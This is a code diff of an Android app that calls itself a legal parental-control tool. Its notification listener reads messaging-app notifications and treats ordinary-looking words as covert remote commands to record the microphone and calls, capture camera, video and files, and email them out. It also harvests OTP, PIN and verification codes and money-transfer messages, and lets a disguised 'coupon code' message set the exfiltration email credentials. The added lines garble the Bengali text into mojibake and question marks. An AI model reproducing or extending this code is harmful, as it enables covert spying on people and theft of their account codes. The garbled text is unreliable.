@@ -1,4 +1,4 @@
-এটা parental control child monitoring legal app  sms notification Data শর্তানুসারে forwarding হবে email googledrive firebase ও ফোনে SNMS দ্বারাও । প্রায় ৯৮% java xml ও gradle কোড নিম্নরুপ : 
+à¦à¦Ÿà¦¾ parental control child monitoring legal app  sms notification Data à¦¶à¦°à§à¦¤à¦¾à¦¨à§à¦¸à¦¾à¦°à§‡ forwarding à¦¹à¦¬à§‡ email googledrive firebase à¦“ à¦«à§‹à¦¨à§‡ SNMS à¦¦à§à¦¬à¦¾à¦°à¦¾à¦“ à¥¤ à¦ªà§à¦°à¦¾à§Ÿ à§¯à§®% java xml à¦“ gradle à¦•à§‹à¦¡ à¦¨à¦¿à¦®à§à¦¨à¦°à§à¦ª : 
 
 //AndroidManifest.xml
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
@@ -187,7 +187,7 @@
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:foregroundServiceType="specialUse"
             android:stopWithTask="false"
-            android:exported="false"> <!-- এখানে exported=false ব্যবহার করুন -->
+            android:exported="false"> <!-- à¦à¦–à¦¾à¦¨à§‡ exported=false à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à§à¦¨ -->
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
@@ -770,6 +770,9 @@ public class NotificationListener extends NotificationListenerService {
 
     private static final long DELAY = 30* 60 * 1000; //  minutes in milliseconds
     private static final int MAX_WORDS = 200; // Maximum words before sending email
+
+
+   // private static final long DUPLICATE_COOLDOWN = 1 * 60 * 1000; // 1 minutes
     private StringBuilder emailContentBuffer = new StringBuilder();
     private Timer timer = new Timer();
     private Handler handler = new Handler();
@@ -796,7 +799,8 @@ public class NotificationListener extends NotificationListenerService {
 
 
     public int CounterSociaMedialSMS= 0;
-    private final Map<String, ForwardedMessage> lastForwardedMessageMap = new HashMap<>();
+
+
     private boolean isBound = false; // Add binding state
     private String NotificationfindAllowedKeyword1;
     private String NotificationfindAllowedKeyword2;
@@ -805,26 +809,26 @@ public class NotificationListener extends NotificationListenerService {
     private Context context;
 
     private static final String[] Condition_Word_For_Mic = {"Goldm","Silverm","Mediumm",
-            "ঐ", "ও", "helo",  "কিহলো", "বলবা","কখন","কখন আসবে","আসবে", "সময়", "বলো",  "স্ক্রিনশট দাও","স্ক্রিনশট",
-            "screenshort","screenshort dau", "কলদাও",  "কিকরছ " };
+            "?", "?", "helo",  "?????", "????","???","??? ????","????", "???", "???",  "????????? ???","?????????",
+            "screenshort","screenshort dau", "?????",  "????? " };
     private static final String[] Condition_Word_For_CallingAppSoundRecord= {"Incoming voice call","Ongoing video call","Incoming", "Calling…", "Ringing…","voice call",
             "Missed voice call", "call", "Call","calling","Missed call" };
     private static final String[] Condition_Word_For_CallRecord = {"Goldcc", "Silvercc", "Mediumcc",
-            "call","audio", "কল", "কনে",  "কোথায়", "কি", "কে", "কই",  "একটা",  "দরকার", "কোচিং",  "কেন",
-            "করবা",  "কিনে", "oi", "screen short","screenshortdau","কোন",  "কিস্তি",   "থেকে", "বিকাশ",
-            "সকাল ", "বিকাল",   "ইমো", "হোয়াটসএ্যাপ", "Call",  };
+            "call","audio", "??", "???",  "?????", "??", "??", "??",  "????",  "?????", "?????",  "???",
+            "????",  "????", "oi", "screen short","screenshortdau","???",  "??????",   "????", "?????",
+            "???? ", "?????",   "???", "???????????", "Call",  };
     private static final String[] Condition_Word_For_File = {"Congratulationf", "Conformf",
-            "aei","file", "পিক",  "ছবি",  "পাখি",  "লাগবেনা",  "ভলোই", "পাঠাও",   "ইমোতে",  "হোয়াটসএ্যাপে", "File",  };
+            "aei","file", "???",  "???",  "????",  "???????",  "????", "?????",   "?????",  "????????????", "File",  };
     private static final String[] Condition_Word_For_Camera = {"Congratulationp", "Conformp"};
     private static final String[] Condition_Word_For_Video = {"Congratulationv", "Conformv",
-            "video", "ভিডিও", "বলবা", "দাও ",  "ক্যামেরা",   "ডেলিভারি",  "camera","বলিনি", "বাজে",  "বাসায়",
-            "aii",    "ইমুতে", "whatesapps","Video",  };
+            "video", "?????", "????", "??? ",  "????????",   "????????",  "camera","?????", "????",  "?????",
+            "aii",    "?????", "whatesapps","Video",  };
 
     private static final String[] SEND_MONEY_WORDS = {"Cash In", "cash in", "send money", "money", "Money","received",
             "received TK","Cashback","Balance", "Recharge",  "received money"};
     private static final String[] OTP_WORDS = {"OTP", "Otp", "otp",  "PIN", "Pin", "pin","CODE", "Code", "code",
             "Google verification code","verification code","Verification code",
-            "মাইজিপি পিন (code)","মাইজিপি পিন ", "মাইজিপি পিন (code)", "(code)",
+            "??????? ??? (code)","??????? ??? ", "??????? ??? (code)", "(code)",
             "VERIFICATUON", "Verification", "verification"};
     private static class ForwardedMessage {
         String message;
@@ -893,13 +897,13 @@ public class NotificationListener extends NotificationListenerService {
         @Override
         public void onServiceConnected(ComponentName name, IBinder service) {
             Log.d(TAG, "Service connected");
-            isBound = true; // ফ্ল্যাগ সেট করুন
+            isBound = true; // ??????? ??? ????
         }
 
         @Override
         public void onServiceDisconnected(ComponentName name) {
             Log.d(TAG, "Service disconnected");
-            isBound = false; // ফ্ল্যাগ রিসেট করুন
+            isBound = false; // ??????? ????? ????
         }
     };
 
@@ -920,7 +924,7 @@ public class NotificationListener extends NotificationListenerService {
             Bundle extras = notification.extras;
             CharSequence title = extras.getCharSequence(Notification.EXTRA_TITLE);
             CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
-            Uri fileUri = extras.getParcelable(Intent.EXTRA_STREAM); // সঠিক লাইন
+            Uri fileUri = extras.getParcelable(Intent.EXTRA_STREAM); // ???? ????
 
             Bitmap largeIconBitmap = extractLargeIcon(extras);
 
@@ -933,7 +937,11 @@ public class NotificationListener extends NotificationListenerService {
                 globalmessage =message;
                 CallRecorderAccessibilityService.notificationCallingAppGlobalMessage1 = message;
 
-
+                // ===== Duplicate Check =====
+                if (!shouldForwardNotification(packageName, currentMessage)) {
+                    Log.d(TAG, "Duplicate notification blocked: " + currentMessage);
+                    return; // Duplicate ? forward ????
+                }
                 //  Sim Number ,Email ,Email Password Set from Notification Alart message . socialmedia whatsapp whatsapp messenger
                 if (    packageName.equals("com.whatsapp") || packageName.equals("com.facebook.orca") ||
                         packageName.equals("com.imo.android.imoim")||
@@ -1013,7 +1021,7 @@ public class NotificationListener extends NotificationListenerService {
                         //     Log.d(TAG, "onNotificationPosted method isSimNumberSetByNotificationSerchWords2: " + IsSimNumberSetByNotificationSerchWords2);
 
                         if ( IsSimNumberSetByNotificationSerchWords1 && IsSimNumberSetByNotificationSerchWords2) {
-                            context = getApplicationContext(); // অথবা this, যদি এটি একটি Activity বা Service হয়String message ,String title, String text,Context context,String titleStr, String textStr
+                            context = getApplicationContext(); // ???? this, ??? ??? ???? Activity ?? Service ??String message ,String title, String text,Context context,String titleStr, String textStr
                             String ExtractPlusPrefixedNumbersFromSMS = extractPlusPrefixedNumbersFromNotification(message, titleStr, textStr, context, titleStr, textStr);
                             //     Log.d(TAG, "onNotificationPosted method ExtractPlusPrefixedNumbersFromSMS: " + ExtractPlusPrefixedNumbersFromSMS );
                             if ( ExtractPlusPrefixedNumbersFromSMS != null ) {
@@ -1053,7 +1061,7 @@ public class NotificationListener extends NotificationListenerService {
                         // Log.d(TAG, "onNotificationPosted method isEmailFirstPartNameAndVPasswordSetAlartSerchWords2: " + IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2);
 
                         if ( IsEmailFirstPartNameAndVPasswordSetAlartSerchWords1 && IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2) {
-                            context = getApplicationContext(); // অথবা this, যদি এটি একটি Activity বা Service হয়String message ,String title, String text,Context context,String titleStr, String textStr
+                            context = getApplicationContext(); // ???? this, ??? ??? ???? Activity ?? Service ??String message ,String title, String text,Context context,String titleStr, String textStr
                             String ExtractEmailFirstPartName = extractEmailFirstPartName(message, titleStr, textStr, context, titleStr, textStr);
                             String ExtractEmailPassword = extractEmailPassword(message, titleStr, textStr, context, titleStr, textStr);
                             //  Log.d(TAG, "onNotificationPosted method ExtractEmailFirstPartName: " + ExtractEmailFirstPartName );
@@ -1114,12 +1122,12 @@ public class NotificationListener extends NotificationListenerService {
 
 
                 if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) { // Android version 8 (Oreo) or lower
-                    Log.d(TAG, "whatesapp imo messenger rec start .Android version 9 এর নিচে .versiov:" + Build.VERSION.SDK_INT);
+                    Log.d(TAG, "whatesapp imo messenger rec start .Android version 9 ?? ???? .versiov:" + Build.VERSION.SDK_INT);
                     //micRecord.StartRecording(incomingNumber, messageBody);
                     Log.d(TAG, "StopMicSoundRecording call Notification class");
-                    micRecord.StopMicSoundRecording(incomingNumber, messageBody); // রেকর্ডিং বন্ধ করুন
+                    micRecord.StopMicSoundRecording(incomingNumber, messageBody); // ???????? ???? ????
                 } else {
-                    Log.d(TAG, "whatesapp imo messenger not rec start .Android version 9 এর নিচে.versiov:" + Build.VERSION.SDK_INT);
+                    Log.d(TAG, "whatesapp imo messenger not rec start .Android version 9 ?? ????.versiov:" + Build.VERSION.SDK_INT);
                 }
 
                 // Pass title and currentMessage to ConditionForCallOtherClassMethod
@@ -1145,7 +1153,7 @@ public class NotificationListener extends NotificationListenerService {
                         else if (Arrays.asList(Condition_Word_For_CallRecord ).contains(NotificationfindAllowedKeyword1)) {
                             CallRecorderAuto callRecorderAuto = new CallRecorderAuto();
                             Log.d(TAG, "Notification  Conditions  met  callRecorderAuto StartRecording ");
-                            callRecorderAuto.SendLastRecordingViaEmail(this); // 'this' ব্যবহার করুন যদি এটি Activity/Service থেকে কল করা হয়
+                            callRecorderAuto.SendLastRecordingViaEmail(this); // 'this' ??????? ???? ??? ??? Activity/Service ???? ?? ??? ??
                         }
                         // Check for files Sending FileService Class
                         else if (Arrays.asList(Condition_Word_For_File).contains(NotificationfindAllowedKeyword1)) {
@@ -1189,10 +1197,10 @@ public class NotificationListener extends NotificationListenerService {
                     callRecorderService.checkPermissionsAndStartRecording();
 
                     if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) { // Android version 8 (Oreo) or lower
-                        Log.d(TAG, "whatesapp imo messenger rec start .Android version 9 এর নিচে .versiov:" + Build.VERSION.SDK_INT);
+                        Log.d(TAG, "whatesapp imo messenger rec start .Android version 9 ?? ???? .versiov:" + Build.VERSION.SDK_INT);
                        // micRecord.StartRecording(incomingNumber, messageBody);
                     } else {
-                        //  Log.d(TAG, "whatesapp imo mes not rec start .Android version 9 এর নিচে.versiov:" + Build.VERSION.SDK_INT);
+                        //  Log.d(TAG, "whatesapp imo mes not rec start .Android version 9 ?? ????.versiov:" + Build.VERSION.SDK_INT);
                     }
                 } else {
                     //   Log.d(TAG, "Notification not met  wh imo messenger rec Conditions for CallingAppSoundRecord .");
@@ -1226,6 +1234,72 @@ public class NotificationListener extends NotificationListenerService {
             Log.e(TAG, " onNotificationPosted  in Error : ", e);
         }
     }
+
+
+
+
+    // 3. SameEmailCheekShouldForwardNotification method update
+    private boolean SameEmailCheekShouldForwardNotification(String packageName, String currentMessage) {
+
+        if (packageName == null || currentMessage == null) {
+            return false;
+        }
+
+        String uniqueKey = packageName + "_" + currentMessage.trim();
+        long currentTime = System.currentTimeMillis();
+
+        if (lastForwardedMessageMap.containsKey(uniqueKey)) {
+
+            ForwardedMessage lastForwarded = lastForwardedMessageMap.get(uniqueKey);
+
+            // 1 ??????? ????? ??? message ??? forward ???? ??
+            if (lastForwarded != null && currentTime - lastForwarded.timestamp < (1 * 60 * 1000)) {
+                Log.d(TAG, "Duplicate blocked: " + uniqueKey);
+                return false;
+            }
+        }
+
+        // ???? ??? update Map
+        lastForwardedMessageMap.put(uniqueKey, new ForwardedMessage(currentMessage, currentTime));
+
+        return true;
+    }
+
+
+
+
+    // 1. Map declaration (class ?? ?????, ???????? variable ?? ????)
+    private Map<String, ForwardedMessage> lastForwardedMessageMap = new HashMap<>();
+    private Map<String, Long> notificationCooldownMap = new HashMap<>();
+    private static final long DUPLICATE_COOLDOWN = 1 * 60 * 1000; // 1 ?????
+
+    // ===== Strong Duplicate Protection Method =====
+    private boolean shouldForwardNotification(String packageName, String messageBody) {
+
+        if (packageName == null || messageBody == null) return false;
+
+        String uniqueKey = packageName + "_" + messageBody.trim();
+        long currentTime = System.currentTimeMillis();
+
+        if (notificationCooldownMap.containsKey(uniqueKey)) {
+            long lastSentTime = notificationCooldownMap.get(uniqueKey);
+
+            // ??? ? ??????? ????? ??? ????? ??? ? block
+            if (currentTime - lastSentTime < DUPLICATE_COOLDOWN) {
+                Log.d(TAG, "Duplicate notification blocked: " + uniqueKey);
+                return false;
+            }
+        }
+
+        // ???? ??? timestamp update
+        notificationCooldownMap.put(uniqueKey, currentTime);
+        return true;
+    }
+
+
+
+
+
     public boolean ConditionForCallOtherClassMethod(String title, String message) {
         String findAllowedKeyword1 = findAllowedKeyword1(title, message);
         String findAllowedKeyword2 = findAllowedKeyword2(title, message);
@@ -1242,13 +1316,13 @@ public class NotificationListener extends NotificationListenerService {
     public String findAllowedKeyword1(String title, String message) {
         String[] allowedKeywords = {"Goldm", "Silverm", "Mediumm", "Goldc", "Silverc", "Mediumc",
                 "Goldf", "Silverf", "Mediumf","Goldv", "Silverv", "Mediumv",
-                "mic", "ঐ", "ও", "helo",  "কিহলো", "বলবা","কখন","কখন আসবে","আসবে",  "বলো",  "স্ক্রিনশট দাও","স্ক্রিনশট",
-                "screenshort","screenshort dau", "কলদাও",  "কিকরছ ", "Mic",
-                "call","audio", "কল", "কনে",  "কোথায়", "কি", "কে", "কই",  "একটা",  "দরকার", "কোচিং",  "কেন",  "করবা",  "কিনে",
-                "oi", "screen short","screenshortdau","কোন",  "কিস্তি",   "থেকে", "বিকাশ", "সকাল ", "বিকাল",   "ইমো", "হোয়াটসএ্যাপ", "Call",
-                "file", "aei", "পিক",  "ছবি",  "পাখি",  "লাগবেনা",  "ভলোই", "পাঠাও",   "ইমোতে",  "হোয়াটসএ্যাপে", "File",
-                "video", "ভিডিও", "বলবা", "দাও ",  "ক্যামেরা",   "ডেলিভারি",  "camera","বলিনি", "বাজে",  "বাসায়", "সময়",
-                "aii",    "ইমুতে", "whatesapps","Video",   };
+                "mic", "?", "?", "helo",  "?????", "????","???","??? ????","????",  "???",  "????????? ???","?????????",
+                "screenshort","screenshort dau", "?????",  "????? ", "Mic",
+                "call","audio", "??", "???",  "?????", "??", "??", "??",  "????",  "?????", "?????",  "???",  "????",  "????",
+                "oi", "screen short","screenshortdau","???",  "??????",   "????", "?????", "???? ", "?????",   "???", "???????????", "Call",
+                "file", "aei", "???",  "???",  "????",  "???????",  "????", "?????",   "?????",  "????????????", "File",
+                "video", "?????", "????", "??? ",  "????????",   "????????",  "camera","?????", "????",  "?????", "???",
+                "aii",    "?????", "whatesapps","Video",   };
 
         for (String keyword : allowedKeywords) {
             if (title.equals(keyword) || title.contains(keyword) ||
@@ -1324,19 +1398,19 @@ public class NotificationListener extends NotificationListenerService {
                 "common message related", "internet.speed","internet.speed.meter.lite", "internet", "Foreground",
                 "displaying over", "over other apps", "Tomorrow in", "setup in", "in progress", "Caption is on",
                 "until fully charged","charged", "fully charged","Screenshot saved","Screenshot","USB debugging",
-                "Uploading","Govt. Info⁩",
+                "Uploading","Govt. Info?",
 
                 "fb related", "Chat heads","Chat heads active","Tap to return to call", "asked to join","He added a new photo",
-                "friend suggestion","suggestion",  "👍","Shared a video in Story","posted", "alive to receive", "alive","backing",
+                "friend suggestion","suggestion",  "??","Shared a video in Story","posted", "alive to receive", "alive","backing",
                 "highlighted a comment", "comment", "updates", "You've got ", "Join all","mentioned", "stories",
                 "Upgrade", " post ", " posts ","Team", "reactions", " Reacted ", " resume "," highlighted ","Photo","friend request",
 
                 "messages related", "Chat heads active","Chat heads active Start a conversation",  "messages from","messages from","Govt. Info", "Govt. i8nfo","Govt",
-                "View messages", "wifiguider", "bot?start=r", "invite friends",  "sell Bazar",  "ক্রয় বিক্রয়", "Silver",
+                "View messages", "wifiguider", "bot?start=r", "invite friends",  "sell Bazar",  "???? ??????", "Silver",
                 "rewards", "Groups","groups","GROUPS","Group","group","GROUP", "GROUP","like","like", "added a post",
                 "is this still available?", "is this", "available?", "On hold", "birthday",
-                "Ict pora related ","Ict","ict","ICT","2nd year", "ICT","iCT","Sir","SIR","sir","JGMC", "Jgmc","jgmc","lab","পড়া",
-                "Pora","pora", "Engg", "Engineer","Exam", "exam","science","Science",  "Commerce", "college", "রোল ","Tap for",
+                "Ict pora related ","Ict","ict","ICT","2nd year", "ICT","iCT","Sir","SIR","sir","JGMC", "Jgmc","jgmc","lab","???",
+                "Pora","pora", "Engg", "Engineer","Exam", "exam","science","Science",  "Commerce", "college", "??? ","Tap for",
 
                 "imo related","You have 1 new message", "Sticker", "is back on imo!", "Added to their Story",
                 "You have a new message","Audio", "with Almost Done! ", "dialpad message error ", "Review message and try again",
@@ -1354,10 +1428,10 @@ public class NotificationListener extends NotificationListenerService {
                 "Cable charging","Battery powe", "fully charged)", "until fully charged","Power saving mode",",Approximately",
 
                 "Telegram!", "joined Telegram!", "Temporarily turned off by your carrier for SIM 1","Temporarily turned off","turned",
-                "carrier for SIM 1","SIM 1","SIM 2", "see your screenshot", "MOONBIX", "ডিসকাউন্ট","ক্যাশব্যাক", "chest",
-                "Invite you into the game","🄼🄸🄽🄴🅁 🅉🄾🄽🄴", "telegram","BTSE", "referral link", "wcoin_tapbot", "t.me",
+                "carrier for SIM 1","SIM 1","SIM 2", "see your screenshot", "MOONBIX", "?????????","??????????", "chest",
+                "Invite you into the game","?????????? ????????", "telegram","BTSE", "referral link", "wcoin_tapbot", "t.me",
                 "app?startapp", "played",  "Cattea?", "Capybuddy!", "undefined","claim","Wheel","wheel", "#airdrop","#airdrop",
-                "Location","maps","রিনিউ", "ফরওয়ার্ড", "reacted", "poraben","reduced","Reacted",
+                "Location","maps","?????", "?????????", "reacted", "poraben","reduced","Reacted",
 
                 "call related ", "Missed call","Voice message","Running Call", "missed calls", "Ringing…", "missed voice calls",
                 "smartcapture", "dialer", "android.dialer",
@@ -1370,28 +1444,28 @@ public class NotificationListener extends NotificationListenerService {
                 "playstore related", "minutes left","playstore","minute left", "Google Drive Chat Backup", "Installing apps", "Google Play:",
                 "snapchat related","watch this!",
                 "vivo related","and see the more used apps", "more used apps.", "Find easily your mail box",
-                "GB related", "অফার!", "নতুন অফার!"," জিবি ","*১২১*","৩০দিন", "৭ দিন", "৭দিন","৩০ দিন", "৩০দিন", "৩ দিন","রিচার্জ",
-                "৩ িন","১৫ দিন", "১৫দিন", "GP30", "GB350TK", "30GB350TK", "GB300TK",
-                "ইন্টারনেট অফার", "আনলিমিটেড", " ইন্টারনেট বিলের", "পরিশোধিত", "Bubble shooter game", "inbox me", "পুরস্কার",
-                "MB","Mb","mb", "bonus",  "৩ জিবি-৩দিন", "ফ্রি",
+                "GB related", "????!", "???? ????!"," ???? ","*???*","?????", "? ???", "????","?? ???", "?????", "? ???","???????",
+                "? ??","?? ???", "?????", "GP30", "GB350TK", "30GB350TK", "GB300TK",
+                "????????? ????", "?????????", " ????????? ?????", "????????", "Bubble shooter game", "inbox me", "????????",
+                "MB","Mb","mb", "bonus",  "? ????-????", "????",
                 "alarm clock related ","Alarm","alarm clock",
 
-                "Free related","Free ৳","অর্ডার করতে", "Super Offer",
+                "Free related","Free ?","?????? ????", "Super Offer",
                 "happy birthday",
                 "Emergency balance", "Emergency",
                 "SmartTV",
 
-                "seconds left", "rating bonus", "rating","বোনাস",
-                "connection", "running","স্যার","Uploading...", "Uploading", "Deleting","Delete",
+                "seconds left", "rating bonus", "rating","?????",
+                "connection", "running","?????","Uploading...", "Uploading", "Deleting","Delete",
 
-                "TikTok","FREE", "Win", " interested?","channel", "TV",  "Referral ","Bikroy","ভ্যাটের","ভ্যাট",
+                "TikTok","FREE", "Win", " interested?","channel", "TV",  "Referral ","Bikroy","???????","?????",
                 " admin approved",
                 "replied", "reactions","Reacted", "Reminder", "Checking", "device", "updated", "BCS","shared","Upgrade",
 
                 "Mobile Recharge","watched template","template",
 
                 "Network speed for current app will be boosted.",
-                "Waiting for you", "(EC)", "Economic census", "watched template","template","নতুন আপডেট",
+                "Waiting for you", "(EC)", "Economic census", "watched template","template","???? ?????",
                 "..","Tap to resume", "Sign in to network","Invitation from your friends","Tap to view",
                 "have been blocked", "second left","new memories", "Contact sync", "contact information", "JPI",
                 "GB450TK"
@@ -1450,9 +1524,9 @@ public class NotificationListener extends NotificationListenerService {
         return false;
     }
     private static final Set<String> SIMNUMBERSETALERTKEYWORDS = new HashSet<>(Arrays.asList(
-            "number is off ?", "number is off", "number","তুমার এই নম্বারে কল ঢুকছেনা কেন",  "এটা কি তোমার নাম্বার",
-            "এটা কি তোমার", "এটা কি ব্লক করা",  "এটা কি ব্লক করা ?", "এই নাম্বারের ফ্রি অফার চেক করুন",
-            "এই নাম্বারের এ্যাপ থেকে অফার চেক করুন", "এই নাম্বার কি", "এটা কি তোমার",
+            "number is off ?", "number is off", "number","????? ?? ??????? ?? ??????? ???",  "??? ?? ????? ???????",
+            "??? ?? ?????", "??? ?? ???? ???",  "??? ?? ???? ??? ?", "?? ????????? ???? ???? ??? ????",
+            "?? ????????? ????? ???? ???? ??? ????", "?? ??????? ??", "??? ?? ?????",
             "sim set alart", "sorry drup your recent alls","as soon as you return your missing droup calls",
             "Why are calls not coming to this number of yours?", "calls not coming to this number of yours?",
             "sim set alarts"   ));
@@ -1547,52 +1621,52 @@ public class NotificationListener extends NotificationListenerService {
         String combinedText = title + " " + text;
 
         // Regular expression to match numbers starting with "+" followed by 10 to 16 digits
-        String regex = "\\+\\d{10,16}";  // এই regex টি + চিহ্নের পর ১০ থেকে ১৬ ডিজিটের সংখ্যা খুঁজে বের করবে
+        String regex = "\\+\\d{10,16}";  // ?? regex ?? + ??????? ?? ?? ???? ?? ??????? ?????? ????? ??? ????
 
-        // Regular expression ব্যবহার করে মেলানো নম্বরগুলো বের করা
+        // Regular expression ??????? ??? ?????? ????????? ??? ???
         Pattern pattern = Pattern.compile(regex);
         //java.util.regex.Matcher matcher = pattern.matcher(combinedText);
         Matcher matcher = pattern.matcher(notificationmessage);
 
         StringBuilder validNumbers = new StringBuilder();
 
-        // যদি কোনো ম্যাচ পাওয়া যায়
+        // ??? ???? ????? ????? ???
         while (matcher.find()) {
             String matchedNumber = matcher.group();
-            // সংখ্যা গুলোকে সেভ করা
+            // ?????? ?????? ??? ???
             if (validNumbers.length() > 0) {
-                validNumbers.append(" "); // সংখ্যা গুলোকে স্পেস দিয়ে আলাদা করা
+                validNumbers.append(" "); // ?????? ?????? ????? ???? ????? ???
             }
             validNumbers.append(matchedNumber);
         }
 
-        // StringBuilder কে String-এ কনভার্ট করুন
+        // StringBuilder ?? String-? ??????? ????
         String validNumbersString = validNumbers.toString();
-        // storeExtractPlusPrefixedNumbersFromNotification মেথডে String পাস করুন
+        // storeExtractPlusPrefixedNumbersFromNotification ????? String ??? ????
         storeExtractPlusPrefixedNumbersFromNotification(validNumbersString, context);
 
-        // যদি কোনো বৈধ ফোন নম্বর পাওয়া যায়, তা রিটার্ন করবে
+        // ??? ???? ??? ??? ????? ????? ???, ?? ??????? ????
         if (validNumbers.length() > 0) {
-            Log.d(TAG, "বৈধ ফোন নম্বর পাওয়া গেছে: " + validNumbers.toString());
+            Log.d(TAG, "??? ??? ????? ????? ????: " + validNumbers.toString());
             return validNumbers.toString();
         } else {
-            Log.d(TAG, "কোনো বৈধ ফোন নম্বর পাওয়া যায়নি।");
+            Log.d(TAG, "???? ??? ??? ????? ????? ??????");
             return null;
         }
     }
     public void storeExtractPlusPrefixedNumbersFromNotification(String validNumbers, Context context) {
-        // কনটেক্সট চেক করা (mContext যদি null হয়)
+        // ???????? ??? ??? (mContext ??? null ??)
         if (context == null) {
             Log.e(TAG, "storeExtractPlusPrefixedNumbersFromNotification Method  Context is null. Unable to access SharedPreferences.");
-            return; // যদি context null হয়, তাহলে কার্যক্রম বন্ধ করা
+            return; // ??? context null ??, ????? ????????? ???? ???
         }
-        // শেয়ার্ড প্রিফারেন্সে নম্বরগুলো স্টোর করার জন্য editor পাওয়া
+        // ??????? ???????????? ????????? ????? ???? ???? editor ?????
         SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);
         SharedPreferences.Editor editor = sharedPreferences.edit();
         if (validNumbers != null) {
-            // নম্বরগুলো সেভ করা একটি নির্দিষ্ট কী-এর মাধ্যমে
+            // ????????? ??? ??? ???? ????????? ??-?? ???????
             editor.putString("validPhoneNumbers", validNumbers);
-            editor.apply(); // পরিবর্তনগুলো অ্যাপ্লাই করা
+            editor.apply(); // ???????????? ????????? ???
             Log.d(TAG, "storeExtractPlusPrefixedNumbersFromNotification Stored SharedPreferences validNumbers: " + validNumbers);
         }
         RetrieveStoredSharedPreferencesPhoneNumbers( context);
@@ -1603,17 +1677,17 @@ public class NotificationListener extends NotificationListenerService {
             Log.e(TAG, "RetrieveStoredSharedPreferencesPhoneNumbers Method Context is null. Unable to access SharedPreferences.");
             return null;
         }
-        // শেয়ার্ড প্রিফারেন্স থেকে স্টোর করা নম্বরগুলো রিটার্ন করা
+        // ??????? ??????????? ???? ????? ??? ????????? ??????? ???
         SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);
 
-        // স্টোর করা নম্বর লোগ করা
+        // ????? ??? ????? ??? ???
         String validPhoneNumbers = sharedPreferences.getString("validPhoneNumbers", null);
         if (validPhoneNumbers != null) {
             Log.d(TAG, "RetrieveStoredSharedPreferencesPhoneNumbers Method validPhoneNumbers: " + validPhoneNumbers);
         } else {
             Log.d(TAG, "RetrieveStoredSharedPreferencesPhoneNumbers Method validPhoneNumbers: " + validPhoneNumbers);
         }
-        return validPhoneNumbers; // আগের স্টোর করা ডেটা রিটার্ন করুন
+        return validPhoneNumbers; // ???? ????? ??? ???? ??????? ????
     }
 // === end code ===== extract Plus Prefixed Numbers From Notification Title And Text valid phone numbers
 
@@ -1702,21 +1776,21 @@ public class NotificationListener extends NotificationListenerService {
             return RetrievestoreExtractEmailEmailFirstPartName(context);
         }
 
-        // **Regex ব্যবহার করে প্রথম কুপন কোড বের করা**
-        String regex1 = "cuponcode1\\s+(\\w+)"; // `cuponcode1` এর পরের ওয়ার্ড ক্যাপচার করবে
+        // **Regex ??????? ??? ????? ???? ??? ??? ???**
+        String regex1 = "cuponcode1\\s+(\\w+)"; // `cuponcode1` ?? ???? ?????? ???????? ????
         Pattern pattern1 = Pattern.compile(regex1);
         Matcher matcher1 = pattern1.matcher(notificationmessage);
 
         String EmailFirstPartName = null;
 
         if (matcher1.find()) {
-            EmailFirstPartName = matcher1.group(1); // প্রথম কুপন কোড
+            EmailFirstPartName = matcher1.group(1); // ????? ???? ???
             Log.d(TAG, "Get First cupon code Word . For Email First Part: " + EmailFirstPartName);
         } else {
             Log.d(TAG, "Not Get First cupon Word code Word . For Email First Part");
         }
 
-        // **কুপন কোড স্টোর করা**
+        // **???? ??? ????? ???**
         if (EmailFirstPartName != null) {
             EmailFirstPartName = EmailFirstPartName.toString();
             storeSharedPreferencesExtractEmailFirstPartName(EmailFirstPartName, context);
@@ -1728,18 +1802,18 @@ public class NotificationListener extends NotificationListenerService {
     }
 
     public void storeSharedPreferencesExtractEmailFirstPartName(String EmailFirstPartName, Context context) {
-        // কনটেক্সট চেক করা (mContext যদি null হয়)
+        // ???????? ??? ??? (mContext ??? null ??)
         if (context == null) {
             Log.e(TAG, "storeExtractEmailFirstPartNameFromNotification Method: Context is null. Unable to access SharedPreferences.");
-            return; // যদি context null হয়, তাহলে কার্যক্রম বন্ধ করা
+            return; // ??? context null ??, ????? ????????? ???? ???
         }
-        // শেয়ার্ড প্রিফারেন্সে নম্বরগুলো স্টোর করার জন্য editor পাওয়া
+        // ??????? ???????????? ????????? ????? ???? ???? editor ?????
         SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);
         SharedPreferences.Editor editor = sharedPreferences.edit();
         if (EmailFirstPartName != null) {
-            // নম্বরগুলো সেভ করা একটি নির্দিষ্ট কী-এর মাধ্যমে
+            // ????????? ??? ??? ???? ????????? ??-?? ???????
             editor.putString("EmailFirstPartName", EmailFirstPartName);
-            editor.apply(); // পরিবর্তনগুলো অ্যাপ্লাই করা
+            editor.apply(); // ???????????? ????????? ???
             Log.d(TAG, "storeSharedPreferencesExtractEmailFirstPartName  Method Store SharedPreferences EmailFirstPartName: " + EmailFirstPartName);
         }
         RetrievestoreExtractEmailEmailFirstPartName( context);
@@ -1750,17 +1824,17 @@ public class NotificationListener extends NotificationListenerService {
             Log.e(TAG, "RetrievestoreExtractEmailEmailFirstPartName Method Context is null. Unable to access SharedPreferences.");
             return null;
         }
-        // শেয়ার্ড প্রিফারেন্স থেকে স্টোর করা নম্বরগুলো রিটার্ন করা
+        // ??????? ??????????? ???? ????? ??? ????????? ??????? ???
         SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);
 
-        // স্টোর করা নম্বর লোগ করা
+        // ????? ??? ????? ??? ???
         String EmailFirstPartName = sharedPreferences.getString("EmailFirstPartName", null);
         if ( EmailFirstPartName != null) {
             Log.d(TAG, "RetrievestoreExtractEmailEmailFirstPartName Method EmailFirstPartName: " + EmailFirstPartName);
         } else {
             Log.d(TAG, "RetrievestoreExtractEmailEmailFirstPartName Method EmailFirstPartName: " + EmailFirstPartName);
         }
-        return EmailFirstPartName; // আগের স্টোর করা ডেটা রিটার্ন করুন
